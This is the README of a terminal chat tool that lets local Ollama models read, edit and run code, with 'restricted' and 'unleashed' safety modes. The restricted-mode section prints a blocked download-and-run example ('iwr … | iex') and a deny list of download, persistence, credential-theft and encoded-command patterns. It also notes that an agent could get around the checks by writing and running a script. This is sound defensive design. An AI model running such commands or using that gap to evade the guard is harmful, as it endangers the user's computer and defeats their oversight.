# ollama-workspace

A terminal chat for **any Ollama model you have installed**, with:

- **Any model, switchable** – pick from your installed models at startup and switch any time with `/model`. Each chat remembers its model, and the chat adapts to what each model supports.
- **Per-project chats** – each folder you launch from is its own project, with named chats and shared project notes, like Claude's projects. Memory never leaks between projects.
- **Lossless persistent memory** – the full transcript is always kept. Older parts are compressed into dated summaries, and the model can search the full transcript for exact details.
- **Code editing** – the model can list, search, outline, read, edit and create files in your project. Every edit shows a colored diff and waits for your approval.
- **File attachments** – drag a file into the terminal (or paste its path) to include its contents in your message.

## Setup

1. Install [Ollama](https://ollama.com/download) and pull at least one model, for example:
   ```
   ollama pull llama3.2
   ```
   Any chat model from the [Ollama library](https://ollama.com/library) works. For code editing, choose one that lists **tools** support (Qwen, Llama 3.1+, Mistral and others).
2. Install the Python package (Python 3.10+):
   ```
   pip install -r requirements.txt
   ```
3. Choose this computer's [mode](#modes-restricted-and-unleashed), then open a new terminal. The tool won't start without one:
   ```
   setx OCHAT_MODE restricted      your own computer
   setx OCHAT_MODE unleashed       a VM you can throw away
   ```
4. Run it from the project folder you want to work on:
   ```
   cd path/to/your/project
   python path/to/ollama-workspace/chat.py
   ```

On first run you pick a model from the ones you have installed. That choice is remembered. If only one model is installed, it's used automatically.

### Platforms

Works on **Windows, macOS and Linux** (tested on Windows 11 and Ubuntu) anywhere Python 3.10+ and Ollama run.

- **Linux:** if `pip install` complains about an "externally managed environment", use a virtual environment: `python3 -m venv .venv && . .venv/bin/activate`. On Ubuntu, that needs `sudo apt install python3-venv` first.
- **Ollama on another machine:** set `OLLAMA_HOST` (e.g. `OLLAMA_HOST=192.168.1.20:11434`) and the chat connects to that server. This is handy for a laptop using a desktop's GPU.
- **Your chats are stored locally** in `data/`, which isn't uploaded to git. To continue chats on another device, copy `data/` to that device's copy of the tool. Projects are keyed by folder path, so continue them from the same path, or use `--workspace`.

## Models

| Command | Does |
|---|---|
| `/models` | List installed models (`*` = current) |
| `/model` | Pick a model from a list |
| `/model <n or name>` | Switch by list number, full name, name without `:latest`, or a unique part of the name (e.g. `/model llama`) |
| `--model <name>` | Choose the model when launching (overrides the chat's saved model) |
| `/think [off\|low\|medium\|high]` | How much a thinking model reasons before answering. Less is faster. Saved per chat; default `low` (`THINK_LEVEL`). With no argument, shows the current level and what the model supports. |
| `--think <level>` | Set the thinking level when launching |

**Which model is used:** a chat reopens with the model it last used. A new chat starts with the model you picked most recently. Models you install later show up in `/models` right away, without restarting.

**What adapts to each model:** the chat reads each model's capabilities from Ollama:

| Model supports | Effect |
|---|---|
| **tools** | File editing, history search and project notes are enabled. Without tool support, the model just chats, and it's told it can't see your files. |
| **thinking** | Its reasoning streams dimmed above the answer. `/think` controls how much it reasons: models that report levels get the closest one (`high` uses the model's strongest, e.g. `xhigh`); others only switch thinking on or off. Models that always think can't be turned off. |
| **context length** | The context window is `NUM_CTX` (32k), or the model's own maximum if that's smaller. Memory, file reads and attachments are scaled to fit, so small-context models still work. Anything trimmed stays on disk. |

Embedding-only models are hidden, since they can't chat.

### Making it faster

Speed depends mostly on whether the model fits in your GPU's memory. Run `ollama ps` while chatting:

- **`100% GPU`:** fast.
- **A large CPU share (e.g. `79%/21% CPU/GPU`):** expect a few tokens per second.

At a few tokens per second, a model that writes 1,000+ tokens of thinking takes minutes before it acts.

1. **Use a model that fits your GPU.** As a rough guide, the model's size in `ollama list`, plus 1–4 GB for context, should be under your VRAM. For example, `qwen3:8b` fits an 8 GB card with `NUM_CTX = 16384`. Switch per chat with `/model`: a small model for quick work, a big one when quality matters.
2. **Think less.** `/think low` or `/think off` cuts the reasoning before each answer and tool call.
3. **Small extras:** set `OLLAMA_FLASH_ATTENTION=1` and `OLLAMA_KV_CACHE_TYPE=q8_0` for the Ollama server and restart it, and close other apps that use the GPU.

## Chats and projects

The folder you launch from is the **workspace**: the project the model works on and keeps memory for.

```
python chat.py                 continue the latest chat in this folder
python chat.py ideas           open the chat named "ideas", or start it
python chat.py --new           start a fresh, unnamed chat
python chat.py --resume        pick a chat from a list
python chat.py --workspace path/to/project    use another folder as the workspace
```

| Command | Does |
|---|---|
| `/new [name]` | Start a new chat in this project; if a chat already has that name, open it |
| `/chats` | List this project's chats (`*` = current) |
| `/resume <n or name>` | Switch chats by number from `/chats`, by name (case-insensitive), or by a unique part of the name |
| `/rename <name>` | Rename the current chat (unnamed chats are titled after their first message; names must be unique) |
| `/notes` | Show the project notes and where to edit them |
| `/mode` | Show this computer's mode and what it allows |
| `/approve [on\|off]` | Ask before file changes (in unleashed mode, also commands), or stop asking. Lasts for this session |
| `/cd [folder]` | Switch the workspace without restarting; opens that folder's latest chat |
| `!<command>` | Run a shell command yourself in the workspace, e.g. `!git status`. Its output isn't sent to the model |
| `"""` | Type a multi-line message by hand; end it with another `"""` line. Pasting needs nothing special: pasted text, line breaks included, never sends by itself, so you can keep typing after it; only an Enter you type sends. Up/Down recalls earlier messages |
| `/trash`, `/restore <n\|path>` | List deleted files, or put one back (see [Getting deleted files back](#getting-deleted-files-back)) |
| `/help` | List commands |
| `exit` | Quit (Ctrl+C at the prompt also works) |

### Interrupting to add information

Press **Ctrl+C** while the model is thinking or answering. The model stops right away and you're asked:

```
[paused] Add info for the model (Enter = just stop):
```

Type a correction or more context, e.g. `it's weekly, not daily`. The model continues **with its reasoning so far** plus your note, rather than starting over. Press Enter on an empty line to just stop. The history records interjections as `[interjected: ...]`, and a stopped reply that hadn't said anything yet isn't saved.

The model sizes each reply to the question, with a safety cap of 4096 tokens (`REPLY_LIMIT` in config.py). Unnamed chats that never got a message are discarded. Named ones are kept.

### Run it from any folder (`ochat`)

Add this folder to your PATH, then open a new terminal:

- **Windows:** `ochat.bat` is included. Add the folder under *Edit environment variables for your account → Path*.
- **macOS/Linux:** `chmod +x ochat`, then add the folder to `PATH` in your shell profile.

```
ochat                 continue the latest chat here
ochat ideas           open or start the "ideas" chat
ochat --model llama   ...with a specific model
```

### Shared install vs. copy inside a project

- **Shared install** – keep one copy anywhere and launch it from any project folder. Every project's memory is kept separately in this copy's `data/` folder.
- **Copy inside a project** – copy the folder into a project (leave out `data/`) and run `python ollama-workspace/chat.py` from the project root. The copy keeps its own `data/`, so the memory travels with the project. Inside a project, the model can't see or edit the tool's own folder, and the tool's `.gitignore` keeps `data/` out of your repo.

## Editing code

Ask in plain language, for example: `the login form doesn't validate emails, fix it`. When the model wants to change a file you'll see:

```
--- a/src/login.py
+++ b/src/login.py
-    return True
+    return EMAIL_RE.match(email) is not None
Apply to src/login.py? [y/N or type feedback]:
```

- `y` applies the edit.
- Enter or `n` rejects it.
- Anything else rejects it and sends your text back to the model as feedback, e.g. `use the existing validator in utils.py`.

The model works like a coding agent, with these tools:

| Tool | What it does | Asks first |
|---|---|---|
| `list_dir`, `list_files`, `find_files` | Browse folders, list a tree, find files or folders by name (`*.py`) | |
| `search_files`, `file_outline`, `read_file` | Search contents, map a large file, read it | |
| `edit_file`, `write_file` | Change part of a file, or create or overwrite one | yes |
| `make_dir`, `move_path`, `delete_path` | Create folders, move or rename, delete files or folders (to the trash) | yes |
| `list_deleted`, `restore_deleted` | See and bring back deleted files and folders | restoring |
| `run_command` | Run a shell command in the workspace (PowerShell on Windows): tests, scripts, git, installs | depends on the [mode](#modes-restricted-and-unleashed) |

The model sees each command's output and exit code. A command is stopped after `COMMAND_TIMEOUT` seconds and can't prompt for input. "Asks first" for file changes can be turned off with `AUTO_APPROVE`.

### Modes: restricted and unleashed

Every computer must choose a mode with the `OCHAT_MODE` environment variable. If it's missing or misspelled, the tool won't start. The mode is shown at startup, and `/mode` shows it at any time. To change it, run `setx OCHAT_MODE …` and open a new terminal; it can't be changed from inside a chat.

**Unleashed** (for a VM): no restrictions. File tools accept any path on the computer, file changes and commands run without asking (`/approve on` to be asked), and the model gets up to `UNLEASHED_TOOL_STEPS` (200) tool steps per message instead of 50.

**Restricted** (for your own computer): you keep every feature and ordinary commands (`python app.py`, `pytest`, `git`, `pip install`, `npm`, …) run without asking. Dangerous commands show why they're risky and need your password:

```
$ iwr https://example.com/install.ps1 | iex
!! RESTRICTED: this command needs your password
  Why: downloads something from the internet and runs it right away, without you
       seeing what it is. This is the most common way malware gets in.
Password (Enter to cancel):
```

| Needs the password | Why |
|---|---|
| Downloads (`curl`, `iwr`, `wget`, `certutil`, `bitsadmin`, …), especially download-and-run | Malware comes in this way, and the same tools can upload your files |
| Admin rights (`runas`, `-Verb RunAs`, `sudo`) | An admin can change anything on the computer |
| Auto-start (scheduled tasks, services, Startup folder, `$PROFILE`) and registry changes | How malware survives a restart |
| Defender, firewall, boot, execution policy, backups, event logs | Disabling defenses is a typical first step of an attack |
| User accounts (`net user`, `New-LocalUser`) | Creating or promoting accounts |
| Saved passwords and keys (`.ssh`, browser logins, `cmdkey`, `.aws`) | Credential theft |
| Hidden or inline code (`-EncodedCommand`, base64, `iex`, `python -c`, `cmd /c`, a nested `powershell`) | You can't see what it really does, and it gets around these checks |
| `setx`, `OCHAT_MODE`, the tool's own code or `data/`, git hooks and `core.hooksPath` | Could switch these protections off |
| Changing or deleting files outside the workspace, formatting disks, shutting down | Damage beyond the project |

Restricted mode also:
- **refuses to start as Administrator**, so commands never inherit admin rights;
- **hides the tool's own code** (`ollama_workspace/`, `chat.py`, the launchers) and the workspace's `.git/hooks` from the file tools, even when the workspace is the tool's folder. Work on the tool itself in unleashed mode or by hand;
- **removes secrets** (variables with `TOKEN`, `SECRET`, `PASSWORD`, `API_KEY`, `AWS_*`, `GITHUB_*`, …) from the environment commands run with;
- tells the model which commands need the password, so it avoids them unless they're needed.

The password is set on the first restricted run. Only a salted hash is stored, in `data/password.json`. If you forget it, delete that file and you'll be asked for a new one.

**What restricted mode can't stop:** the checks read the command text, so they're a strong speed bump, not a wall. The main gap: the model can write a script with the file tools and run it as an ordinary command (`python script.py`), and the script can do anything a dangerous command could. With `AUTO_APPROVE` off you see every script before it's saved, so keep it off when working on code you don't trust, such as a freshly cloned repo, or use the VM. Approved commands run with your own user's permissions.

### Getting deleted files back

`delete_path` doesn't erase anything: it moves the file or folder into the project's trash in `data/`. To get it back, ask the model (`bring back utils.py`) or do it yourself:

```
/trash              list deleted items, newest first
/restore 2          restore item 2 to where it was
/restore utils.py   restore by path (or part of one)
/trash empty        delete everything in the trash for good
```

If something already exists at the original path, nothing is overwritten: the model offers to restore under another name. Items are kept for `TRASH_DAYS` (30) days. Only `delete_path` uses the trash: files removed by a shell command, or overwritten by an edit, can't be restored this way.

The model can only touch files inside the workspace, and it can never read the tool's `data/` folder. To let it browse more, start it in a higher folder or use `--workspace`. Hidden folders (`.git`, `.venv`, …), `node_modules`, `__pycache__`, `venv`, `dist` and `build` are skipped when it lists or searches. Shell commands run with your own permissions, so they *can* reach outside the workspace (see the modes above). Use version control: deletes go to the trash, but other changes have no built-in undo.

### Large files

A model reads plain text as tokens, so file contents can't be compressed in a form it can still read. Instead, contents stay out of the context until the model needs them:

| Mechanism | What it does |
|---|---|
| `file_outline` tool | Returns only a file's classes, functions and headings, with line numbers. A 3,000-line file becomes a short map. |
| `read_file` line ranges | After the outline, the model reads only the lines it needs. |
| `edit_file` exact replacement | The model sends just the snippet to change, so edits work no matter how big the file is. |
| Read limit tied to context | One read or attachment can use up to `READ_SHARE` (40%) of the model's context window. |
| Automatic context trimming | If a long session would overflow the window, the oldest tool outputs are cleared first. Without this, Ollama silently drops the start of the conversation, which holds the memory and instructions. |

## Attaching files

Any existing file path in your message gets its contents attached:

```
> what does this do? "C:\Users\you\Documents\script.py"
[attached: script.py]
```

Paths may be quoted, unquoted, or written as `@path`. Paths with spaces need quotes (drag-and-drop adds them). The log records attachments by name only.

## Memory

Everything is stored in the tool's `data/` folder, which is git-ignored:

```
data/settings.json                    last model you picked
data/password.json                    restricted mode's password (salted hash only)
data/projects/<folder>-<hash>/
  project.json                        which folder this project belongs to
  notes.md                            project notes: every chat in the project sees them
  trash/<id>/                         deleted files and folders, restorable for TRASH_DAYS
  chats/<id>/log.txt                  full transcript: append-only, never shortened
  chats/<id>/chat.json                name, model, dates, and compressed summaries
```

A project is identified by its full folder path, so two folders that share a name stay separate.

**Each turn the model sees** the project notes, the dated summaries of older conversation, and the recent raw log of the current chat. All of it is trimmed to `MEMORY_SHARE` (50%) of the model's context window.

**How compression avoids losing memory:**

- **Summaries aren't rewritten.** Once the recent log passes `MAX_RECENT`, its oldest part becomes a new dated summary and older summaries are left as they are. (Rewriting one summary every time erodes old details a little more with each pass.)
- **Only the oldest summaries get merged.** When the summaries together pass `SUMMARY_BUDGET`, just the two oldest are merged, so recent history keeps the most detail.
- **The transcript is never cut.** `log.txt` keeps every word. The `search_history` tool searches it (or every chat in the project) and returns the exact original text.
- **Progress is saved as it goes.** Every exchange is saved immediately, and summaries are saved after each piece is compressed.

The current model does the compression, so it takes longer on large models running mostly on the CPU. To wipe one project's memory, delete its folder in `data/projects/`. Delete `data/` to wipe everything.

## Settings

All settings are in `ollama_workspace/config.py`:

| Setting | Default | Meaning |
|---|---|---|
| `NUM_CTX` | 32768 | Max context window in tokens (a model with a smaller max uses its own) |
| `THINK_LEVEL` | `low` | Thinking level for chats that haven't set one with `/think` |
| `THINK_BUDGET` | 4096 | Extra tokens for reasoning at `medium`; `low` gets half, `high` double |
| `MAX_RECENT` / `KEEP_RECENT` | 30k / 15k chars | When to compress older log, and how much raw log stays visible |
| `CHUNK` | 15k chars | Log covered by each summary |
| `SUMMARY_BUDGET` | 12k chars | Total summary size before the two oldest merge |
| `MEMORY_SHARE` | 0.5 | Max share of the context for memory |
| `READ_SHARE` | 0.4 | Max share of the context for one file read |
| `MAX_TOOL_STEPS` | 50 | Max tool calls per message (restricted mode) |
| `UNLEASHED_TOOL_STEPS` | 200 | Max tool calls per message (unleashed mode) |
| `AUTO_APPROVE` | False | Restricted mode: edit, create, move and delete files without asking (unleashed never asks) |
| `MAX_COMMAND_TIMEOUT` | 3600 | The longest timeout the model may give `run_command` |
| `COMMAND_TIMEOUT` | 300 | Seconds before a shell command is stopped |
| `TRASH_DAYS` | 30 | Days deleted files stay restorable |

**Context size and memory use:** a bigger `NUM_CTX` lets the model see more, but it takes more RAM or VRAM. For example, one 27B model measured 18 GB at 16k context, 22 GB at 64k, and 26 GB at 128k. To fit more context in the same memory, set these environment variables for the Ollama server and restart it:

```
OLLAMA_FLASH_ATTENTION=1
OLLAMA_KV_CACHE_TYPE=q8_0
```

## Project layout

```
chat.py                  entry point
ochat.bat / ochat        launchers for Windows / macOS and Linux
ollama_workspace/
  chat.py                the chat loop: read a message, run the model and its tools, save
  prompts.py             system prompts and the /help text
  stream.py              requests to the model: context trimming, streaming, Ctrl+C, thinking
  session.py             picking, opening and switching chats and models
  commands.py            /commands, /cd and !command
  tools/                 the tools the model can call
    base.py              shared: workspace limits, hidden paths, approvals
    browse.py            list_dir, list_files, find_files, search_files, file_outline, read_file
    edit.py              edit_file, write_file, make_dir, move_path
    deleting.py          delete_path, list_deleted, restore_deleted
    shell.py             run_command
    history.py           search_history, save_note
  guard.py               restricted / unleashed modes, dangerous-command checks, password
  trash.py               deleted files: move to trash, list, restore
  memory.py              projects, chats, log and compression
  models.py              installed models, capabilities, model switching
  config.py              settings and paths
  attachments.py         file attachments in messages
  console.py             reading input (multi-line paste, history)
data/                    your chats, notes and settings (created on first run, git-ignored)
```

## License

[MIT](LICENSE) - free to use, modify and share, including commercially, as long as the copyright notice is kept. The software comes with no warranty.
